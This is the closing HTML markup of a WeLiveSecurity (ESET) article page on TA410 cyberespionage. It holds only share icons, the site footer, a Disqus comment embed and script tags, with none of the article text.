            <svg id="Layer_2" fill="#949ca1" class="twitter" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><g id="Layer_1-2"><g id="x"><g transform="scale(0.75) translate(8.33, 8.33)"><path fill="#fff" d="M 5.9199219 6 L 20.582031 27.375 L 6.2304688 44 L 9.4101562 44 L 21.986328 29.421875 L 31.986328 44 L 44 44 L 28.681641 21.669922 L 42.199219 6 L 39.029297 6 L 27.275391 19.617188 L 17.933594 6 L 5.9199219 6 z M 9.7167969 8 L 16.880859 8 L 40.203125 42 L 33.039062 42 L 9.7167969 8 z"/></g></g></g></g></svg>        </a>
        <a href="mailto:?&amp;subject&#x3D;I wanted you to see this site&amp;body&#x3D;https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/" title="mail" >
            <svg id="Layer_2" fill="#949ca1" class="social-icon" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><path id="Path_7761" fill="white"d="m13.1593,14.9378c-.2808,0-.5616.0936-.8424.1872l11.8875,11.5131c.3744.468,1.0296.468,1.404.0936.0936,0,.0936-.0936.0936-.0936l12.0747-11.5131c-.2808-.0936-.5616-.1872-.7488-.1872H13.1593Zm-2.1529,1.9656v15.8188c-.0936,1.2168.8424,2.2465,2.0593,2.3401h23.8686c1.2168-.0936,2.1529-1.1232,2.0593-2.3401v-15.7252l-11.7939,11.3259c-1.2168,1.2168-3.1825,1.2168-4.3057,0l-11.8875-11.4195Z" /></g></svg>        </a>
        <a href="https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/" title="copy" class="copy-link" >
            <svg id="Layer_2" fill="#949ca1" class="social-icon" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><path fill="white"d="m32.2813,27.4375l3.7-3.7c2.7-2.7,2.7-7,0-9.7-2.7-2.7-7-2.7-9.7,0h0l-5.3,5.3c-2.7,2.7-2.7,7,0,9.7.4.4.8.7,1.3,1l2.8-2.8c-.6-.1-1.1-.4-1.5-.8-1.2-1.2-1.2-3.2,0-4.4l5.3-5.3c1.3-1.2,3.2-1.1,4.4.1,1.1,1.2,1.1,3.1,0,4.3l-1.6,1.6c.7,1.4.9,3.1.6,4.7h0Zm-14.7-4.7l-3.6,3.6c-2.7,2.7-2.6,7,0,9.7,2.7,2.6,6.9,2.6,9.6,0l5.3-5.3c2.7-2.7,2.7-7,0-9.7-.4-.4-.8-.7-1.3-1l-2.8,2.8c1.7.4,2.7,2.1,2.3,3.7-.1.6-.4,1.1-.8,1.5l-5.3,5.4c-1.2,1.3-3.1,1.3-4.4.1-1.3-1.2-1.3-3.1-.1-4.4,0-.1.1-.1.1-.1l1.6-1.5c-.7-1.6-.9-3.2-.6-4.8h0Z" /></g></svg>        </a>
    </div>
</div>                                </div>
                            </div>
                        </div>
                    </div>
                            </div>
        </div>

        <div class="row">
            <div class="col col-lg-8 pe-lg-0">
                <div class="my-4">
                    <h3 class="articles-title-divider">Discussion</h3>
                </div>

                <div id="disqus_thread"></div>

            </div>
        </div>
    </div>
        </div>
        
        <!-- footer -->
        
        <footer class="page-footer">
  <div class="container">
    <div class="row g-0">
      <div class="col page-info-wrapper">
        <div class="logo-wrapper">
          <div class="logo">
            <a href="/en/" title="Welivesecurity">
              <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 290 31.7919"><defs><style>.cls-1{fill:#0b8690;}.cls-2{fill:#053b44;}</style></defs><g id="Layer_1-2"><g><path class="cls-2" d="M0,8.6081H5.1069l2.869,10.7299,3.3282-10.845h4.3616l3.3833,10.845,2.9261-10.7879h4.9947l-5.51,17.8465h-4.5336l-3.3833-10.903-3.5012,10.903H5.451L0,8.6081Zm26.6257,9.0093h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3955c.3233,2.123,2.219,3.6443,4.3616,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.8729,2.5259c-1.7441,2.1958-4.4284,3.4313-7.2306,3.3282-4.9064,.227-9.0678-3.5664-9.2947-8.4728-.0109-.236-.0124-.4724-.0045-.7085Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7303-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5747Zm57.842,7.9179l2.1266-3.3282c1.5999,1.2513,3.5393,1.9923,5.566,2.1267,1.4345,0,2.1266-.5162,2.1266-1.3195v-.057c0-1.0904-1.7216-1.4345-3.6733-2.0658-2.4679-.7463-5.2789-1.8937-5.2789-5.3369v-.057c0-3.6153,2.9261-5.6231,6.4843-5.6231,2.3553,.0234,4.6511,.742,6.5994,2.0658l-1.8937,3.5003c-1.4459-.9422-3.1015-1.5139-4.8207-1.6646-1.2054,0-1.8366,.5162-1.8366,1.2054v.057c0,.9754,1.6646,1.4345,3.6153,2.1267,2.4679,.8033,5.3369,2.0087,5.3369,5.2789v.057c0,3.9633-2.9261,5.7381-6.7666,5.7381-2.7543-.0573-5.4158-1.006-7.5854-2.7037Zm15.4356-6.4264h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3375c.3233,2.123,2.219,3.6443,4.3616,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.869,2.5249c-1.744,2.1959-4.4283,3.4315-7.2306,3.3282-5.3901,.001-9.3534-3.7835-9.3534-9.1804Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7303-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5747Zm6.1412,1.4906h0c-.0992-5.0349,3.9019-9.197,8.9368-9.2964h.3596c2.6878-.1539,5.2947,.9485,7.0566,2.9841l-3.0991,3.3282c-.9721-1.2277-2.4505-1.9458-4.0165-1.9507-2.5249,0-4.3036,2.2378-4.3036,4.8198v.057c0,2.697,1.7787,4.8778,4.4756,4.8778,1.5606-.0446,3.0342-.7295,4.0745-1.8937l2.9261,2.9841c-1.7686,2.1577-4.4423,3.3673-7.2306,3.2712-5.0035,.0682-9.115-3.9326-9.1832-8.9361,0-.0009,0-.0017,0-.0026,.0026-.0806,.0038-.1614,.0039-.2426Zm17.9606,2.5249V8.6642h5.0498v9.8706c0,2.4099,1.1474,3.6153,3.0411,3.6153s3.1562-1.2054,3.1562-3.6153V8.6071h5.0498V26.3386h-5.0498v-2.5249c-1.1459,1.7743-3.1079,2.8527-5.22,2.869-3.7893,.001-6.0271-2.4669-6.0271-6.5414Zm18.4767-11.5342h5.0498v3.5573c1.0324-2.4679,2.697-4.0165,5.6811-3.9024v5.2789h-.29c-3.3282,0-5.3939,2.0087-5.3939,6.2543v6.5414h-5.047V8.6071Zm12.5666,0h5.0498V26.3386h-5.0498V8.6071Zm8.9561,12.7396V12.9117h-2.1267v-4.3036h2.1267V4.0745h5.0498v4.5336h4.1885v4.3036h-4.1924v7.5747c0,1.1474,.5162,1.7216,1.6066,1.7216,.8637,.0094,1.7148-.2083,2.4679-.6312v4.0165c-1.1964,.7132-2.571,1.0716-3.9633,1.0334-3.0952,.057-5.1571-1.2054-5.1571-5.2799Zm11.4153,9.1813l1.6646-3.6153c.6415,.4009,1.372,.6373,2.1267,.6883,.7821,.0558,1.5071-.4118,1.7787-1.1474l-6.9474-17.7885h5.3369l4.0165,12.1074,3.8444-12.1074h5.22l-6.7666,18.1326c-1.3775,3.6153-2.812,4.9928-5.8531,4.9928-1.5664,.0294-3.1059-.4102-4.4205-1.2625ZM182.4783,1.3195c1.3945,0,2.5249,1.1304,2.5249,2.5249s-1.1304,2.5249-2.5249,2.5249-2.5249-1.1304-2.5249-2.5249,1.1304-2.5249,2.5249-2.5249Zm38.8471,2.754v2.1267h-.6312v-2.1267h-.8603v-.5162h2.3528v.4592h-.8603l-.0009,.057Zm4.0755,2.1238v-1.7796l-.8033,1.7787h-.6312l-.7463-1.7787,.057,.3441v1.3775h-.5732V3.5573h.7463l.8603,2.0658,.9753-2.0658h.6883v2.6399h-.5732Z" /><path class="cls-1" d="M46.2508,2.2378h5.0498V26.3956h-5.0498V2.2378Zm7.9189,6.3693h5.0498V26.3386h-5.0498V8.6071Zm6.5414,0h5.3369l3.9633,11.8783,4.0126-11.8783h5.22l-7.0005,17.8465h-4.5907l-6.9416-17.8465Zm17.9035,9.0102h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3375c.3232,2.1226,2.2184,3.6438,4.3606,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.869,2.5249c-1.744,2.1959-4.4283,3.4315-7.2306,3.3282-5.3891,.001-9.3524-3.7835-9.3524-9.1804Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7294-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5738ZM56.6366,0c-1.7746,0-3.2132,1.4386-3.2132,3.2132,0,1.7746,1.4386,3.2132,3.2132,3.2132,1.7746,0,3.2132-1.4386,3.2132-3.2132h0c-.0188-1.7667-1.4464-3.1943-3.2132-3.2132Zm0,4.5907c-.7567-.0094-1.3677-.6208-1.3765-1.3775-.0202-.7605,.58-1.3933,1.3405-1.4135,.7605-.0202,1.3933,.58,1.4135,1.3405,.0006,.0243,.0006,.0487,0,.073-.0089,.7571-.6204,1.3686-1.3775,1.3775Zm191.3425,4.0213c-2.2021-.0287-4.2611,1.0885-5.4375,2.9502-.9299,1.6095-1.1339,4.233-1.1339,5.9711s.2049,4.3596,1.1339,5.9691c1.1767,1.8615,3.2355,2.9785,5.4375,2.9502h34.4972c2.2018,.0283,4.2603-1.0888,5.4365-2.9502,.928-1.6095,1.1349-4.233,1.1349-5.9711s-.2069-4.3567-1.1349-5.9662c-1.1762-1.8615-3.2347-2.9786-5.4365-2.9502l-34.4972-.0029Zm22.9572,7.9392h2.9v-.0899c0-1.3272-.5326-1.4268-1.4896-1.4268-1.16,0-1.3794,.377-1.4133,1.5167m-20.3859-1.4297c.9512,0,1.4635,.0967,1.4635,1.3997v.0628h-2.8487c.0319-1.1165,.2591-1.4626,1.3852-1.4626m-4.0233,2.463c0,3.1262,.783,4.2533,4.0745,4.2533,1.0071,.0751,2.0175-.0927,2.9464-.4891,.7808-.4894,1.2122-1.3829,1.1097-2.2987h-2.5965c-.0271,.8903-.6322,.9821-1.4626,.9821-1.1996,0-1.4336-.4833-1.4336-1.9788v-.0638h5.4887v-.405c0-3.4123-.9231-4.2668-4.06-4.2668-3.3553,0-4.0745,1.044-4.0745,4.2668m9.8793-1.5621c0,1.6665,.5742,2.4476,4.0735,2.4476,.3744-.0275,.7508,.0097,1.1126,.1102,.2736,.1199,.4021,.3586,.4021,.7927,0,.726-.2658,.8043-1.5128,.8043-.6931,0-1.3987-.0155-1.4307-.9502h-2.6438c.0203,1.8425,.8932,2.4447,2.5085,2.5732,.4882,.0377,1.0188,.0348,1.565,.0348,2.2233,0,4.0735-.3712,4.0735-2.7849,0-2.2997-1.1996-2.463-4.0745-2.5288-1.4268-.0319-1.5109-.3316-1.5109-.8043,0-.5616,.0619-.7405,1.5119-.7405,.5317,0,1.0633,.0474,1.1822,.7086h2.4882v-.3393c0-2.001-2.0967-2.03-3.6733-2.03-2.3625,0-4.0735,.0532-4.0735,2.7066m21.6744-2.7066h6.5018v1.9005h-1.9333v6.525h-2.6274v-6.524h-1.9333l-.0077-1.9014Zm-9.7275,4.2059c0-3.2122,.7086-4.2398,4.0464-4.2398,3.1194,0,4.031,.842,4.031,4.2398v.376h-5.4896v.0909c0,1.4945,.2359,2.0058,1.4587,2.0058,.8226,0,1.45-.0909,1.4896-.9821h2.5413c.0948,.8946-.3269,1.7653-1.0875,2.2456-.9243,.3931-1.9294,.5588-2.9309,.4833-3.276,0-4.0464-1.1088-4.0464-4.2224m-23.7624,5.7874c-1.3214-1.421-1.6134-3.652-1.6134-5.7739s.29-4.35,1.6134-5.7758c1.0333-.9868,2.3994-1.5498,3.828-1.5776h17.7865v14.7048h-17.7865c-1.4285-.0278-2.7946-.5908-3.828-1.5776m43.7423-16.12c.0004-.036-.009-.0714-.0271-.1025-.0116-.0387-.0445-.0628-.086-.0899-.0385-.0194-.0807-.0303-.1237-.0319-.0559-.0087-.1126-.0123-.1692-.0106h-.1508v.5394h.115c.0678,.0013,.1357-.0022,.203-.0106,.0495-.0114,.0968-.0307,.1402-.057,.0317-.0265,.0574-.0594,.0754-.0967,.016-.0456,.0235-.0938,.0222-.1421m.8226,1.3533h-.61l-.5742-.7086h-.1933v.7066h-.4679v-1.913h.7269c.1085-.0031,.2172,.0024,.3248,.0164,.0855,.0088,.1681,.0355,.2426,.0783,.0789,.0405,.1456,.1012,.1933,.1759,.0425,.0819,.0625,.1737,.058,.2658,.0044,.1242-.0384,.2454-.1199,.3393-.0832,.0952-.1884,.1685-.3064,.2136l.7259,.8255Zm.4186-.9203c.0053-.4029-.1547-.7903-.4427-1.072-.2749-.2868-.6574-.4452-1.0546-.4369-.3998-.0086-.7851,.1497-1.0633,.4369-.5856,.5955-.5856,1.5505,0,2.146,.5715,.5851,1.5091,.5962,2.0942,.0247,.0083-.0081,.0166-.0164,.0247-.0247,.289-.2818,.4492-.6703,.4427-1.074m.4253,0c.0069,.5131-.1972,1.0066-.5645,1.3649-.7536,.747-1.9685,.747-2.7221,0-.3705-.3563-.5758-.851-.5665-1.3649-.0083-.5104,.1971-1.001,.5665-1.3533,.7441-.75,1.955-.7561,2.7066-.0135l.0135,.0135c.3662,.3543,.5704,.8438,.5645,1.3533m-64.0238,6.7637h2.1044c1.5563,0,2.32,.6206,2.32,1.74,.0109,.539-.2936,1.0349-.7791,1.2692v.0242c.7243,.1716,1.2395,.8131,1.2509,1.5573,0,1.16-.6767,1.9652-2.5133,1.9652h-2.3828v-6.5559Zm2.0483,2.7588c.7414,0,1.1126-.2591,1.1126-.8893,0-.6767-.4456-.899-1.2799-.899h-.6109v1.7883h.7782Zm.2127,2.7898c.87,0,1.362-.2223,1.362-.9261s-.5007-.9667-1.4829-.9667h-.87v1.8908l.9908,.0019Zm4.9406-1.248l-2.32-4.3007h1.4548l1.5418,3.2267,1.6433-3.2248h1.4084l-2.4659,4.2726v2.2775h-1.2566l-.0058-2.2514Z" /></g></g></svg>            </a>
          </div>
        </div>
        <div class="page-info">
          <p>
            Award-winning news, views, and insight from the ESET security community
          </p>
        </div>
      </div>
      <div class="col footer-links">
        <a href="/en/company/about-us/" title="About us" 
         >About us</a>
        <a href="https://www.eset.com/us" title="ESET" 
         >ESET</a>
        <a href="/en/company/contact-us/" title="Contact us" 
         >Contact us</a>
        <a href="/en/company/privacy/" title="Privacy Policy" 
         >Privacy Policy</a>
        <a href="/en/company/legal-information/" title="Legal Information" 
         >Legal Information</a>
        <a href="/en/#" title="Manage Cookies" id="manage-cookies" 
         onclick="event.preventDefault()" >Manage Cookies</a>
        <a href="/en/rss/feed/" title="RSS Feed" 
         >RSS Feed</a>
      </div>
      <div class="col social-networks">
        <a href="https://www.facebook.com/eset/" title="Join our facebook fan site!">
          <svg id="Layer_2" fill="#949ca1" class="facebook" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><path fill="white"d="m30.9623,26.8125l.8054-5.2483h-5.0359v-3.4058c0-1.4358.7035-2.8354,2.9589-2.8354h2.2894v-4.4684s-2.0776-.3546-4.064-.3546c-4.1472,0-6.858,2.5137-6.858,7.0642v4h-4.61v5.2483h4.61v12.6875h5.6737v-12.6875h4.2305Z" /></g></svg>        </a>
        <a href="https://youtube.com/esetglobal" title="Watch our videos at YouTube Channel.">
          <svg id="Layer_2" fill="#949ca1" class="youtube" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><g id="Layer_1-2"><g id="youtube"><g id="SOCIAL_MEDIA"><path id="youtube-2" fill="white"d="m39.3741,17.7792c-.3492-1.2938-1.3598-2.3044-2.6536-2.6536-2.3399-.625-11.7206-.625-11.7206-.625,0,0-9.3745,0-11.7206.625-1.2941.3485-2.305,1.3594-2.6536,2.6536-.4319,2.3823-.6412,4.7997-.6249,7.2208-.0162,2.4211.193,4.8385.625,7.2208.3478,1.2946,1.359,2.3058,2.6536,2.6536,2.3399.625,11.7206.625,11.7206.625,0,0,9.3807,0,11.7206-.625,1.2942-.3485,2.3051-1.3594,2.6536-2.6536.4315-2.3824.6408-4.7997.625-7.2208.0158-2.4211-.1934-4.8384-.625-7.2208h0Zm-17.374,11.7205v-8.9994l7.7933,4.4997-7.7933,4.4997Z" /></g></g></g></g></svg>        </a>
        <a href="https://twitter.com/ESET" title="Visit the official WLS Twitter page.">
          <svg id="Layer_2" fill="#949ca1" class="twitter" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><g id="Layer_1-2"><g id="x"><g transform="scale(0.75) translate(8.33, 8.33)"><path fill="#fff" d="M 5.9199219 6 L 20.582031 27.375 L 6.2304688 44 L 9.4101562 44 L 21.986328 29.421875 L 31.986328 44 L 44 44 L 28.681641 21.669922 L 42.199219 6 L 39.029297 6 L 27.275391 19.617188 L 17.933594 6 L 5.9199219 6 z M 9.7167969 8 L 16.880859 8 L 40.203125 42 L 33.039062 42 L 9.7167969 8 z"/></g></g></g></g></svg>        </a>
        <a href="https://www.linkedin.com/company/eset" title="Follow us on LinkedIn.">
          <svg id="Layer_2" fill="#949ca1" class="linkedin" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><path fill="white"d="m18.7686,35.9995h-4.9757v-16.0232h4.9757v16.0232Zm-2.4905-18.2089c-1.5911,0-2.8816-1.3179-2.8816-2.9089.0002-1.5915,1.2906-2.8814,2.882-2.8812,1.5911.0002,2.881,1.29,2.8812,2.8812,0,1.5911-1.2911,2.9089-2.8816,2.9089Zm21.113,18.2089h-4.965v-7.8c0-1.8589-.0375-4.2429-2.587-4.2429-2.587,0-2.9834,2.0196-2.9834,4.1089v7.9339h-4.9704v-16.0232h4.7721v2.1857h.0696c.6643-1.2589,2.287-2.5875,4.7079-2.5875,5.0357,0,5.9614,3.3161,5.9614,7.6232v8.8018h-.0054Z" /></g></svg>        </a>
        <a href="https://www.welivesecurity.com/rss-configurator/" title="Don´t miss a single post!">
          <svg id="Layer_2" fill="#949ca1" class="social-icon" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><g id="rss"><g id="SOCIAL_MEDIA"><path id="rss-2" fill="white"d="m16.9299,36.9089c-1.8039-.0139-3.255-1.4876-3.2411-3.2915.0139-1.8039,1.4876-3.255,3.2915-3.2411,1.7931.0138,3.2398,1.4706,3.2412,3.2638-.006,1.8113-1.4791,3.2748-3.2904,3.2688-.0004,0-.0008,0-.0012,0Zm12.6168,0c-.0331-8.7521-7.1549-15.8203-15.907-15.7872h-.0014v4.6272c6.1869-.0232,11.2214,4.9731,11.2452,11.16h4.6632Zm8.0916,0c-.0503-13.2044-10.7953-23.8679-23.9997-23.8176-.0001,0-.0002,0-.0003,0v4.7628c10.5637-.0398,19.1597,8.4911,19.2,19.0548h4.8Z" /></g></g></g></svg>        </a>
      </div>
    </div>
    <div class="row g-0">
      <div class="col copyright">
        Copyright © ESET, All Rights Reserved
      </div>
    </div>
  </div>
</footer>    </div>

    <!-- scroll to top button -->
    <button id="scrollToTopBtn" aria-label="Scroll to top">
    <svg viewBox="0 0 45 45">
        <defs>
            <style>
                .st0 {
                    fill: #949ca1;
                }
            </style>
        </defs>
        <g id="Group_1214">
            <polygon class="st0" points="36.1 26.9 34.6 28.5 22.9 16.8 11.2 28.5 9.7 26.9 22.9 13.7 36.1 26.9"/>
            <path id="Ellipse_360" class="st0" d="M22.5,2c-11.3,0-20.5,9.2-20.5,20.5,0,8.2,4.9,15.7,12.5,18.9,10.4,4.4,22.5-.5,26.9-10.9s-.5-22.5-10.9-26.9h0c-2.5-1.1-5.2-1.6-8-1.6M22.5,0C34.9,0,45,10.1,45,22.5s-10.1,22.5-22.5,22.5S0,34.9,0,22.5,10.1,0,22.5,0Z"/>
        </g>
    </svg>
</button>    <!-- scripts -->
    <link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/app-7a4ecde0.js" /><script type="module" src="https://www.welivesecurity.com/build/assets/app-7a4ecde0.js"></script>    <link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/scrollToTopBtn-bfad6333.js" /><script type="module" src="https://www.welivesecurity.com/build/assets/scrollToTopBtn-bfad6333.js"></script>    <link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/search-9bd6bdd3.js" /><link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/_commonjsHelpers-042e6b4d.js" /><script type="module" src="https://www.welivesecurity.com/build/assets/search-9bd6bdd3.js"></script>        
<script>

    var disqus_config = function () {
        this.page.url = "https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/";
        this.page.identifier = "A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity";
        this.page.title = "11695";
        this.language = "en";
    };
   
    (function() {
        var d = document, s = d.createElement('script');

        s.src = 'https://welivesecurity.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();

</script>

    <link rel="preload" as="style" href="https://www.welivesecurity.com/build/assets/prism-40494b65.css" /><link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/prism-40d1b0a4.js" /><link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/_commonjsHelpers-042e6b4d.js" /><link rel="stylesheet" href="https://www.welivesecurity.com/build/assets/prism-40494b65.css" /><script type="module" src="https://www.welivesecurity.com/build/assets/prism-40d1b0a4.js"></script>    <link rel="preload" as="style" href="https://www.welivesecurity.com/build/assets/article-e3625c4c.css" /><link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/article-98874652.js" /><link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/table-wrapper-135558d1.js" /><link rel="stylesheet" href="https://www.welivesecurity.com/build/assets/article-e3625c4c.css" /><script type="module" src="https://www.welivesecurity.com/build/assets/article-98874652.js"></script>            <link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/tableOfContents-3064eaf8.js" /><script type="module" src="https://www.welivesecurity.com/build/assets/tableOfContents-3064eaf8.js"></script>    </body>
</html>
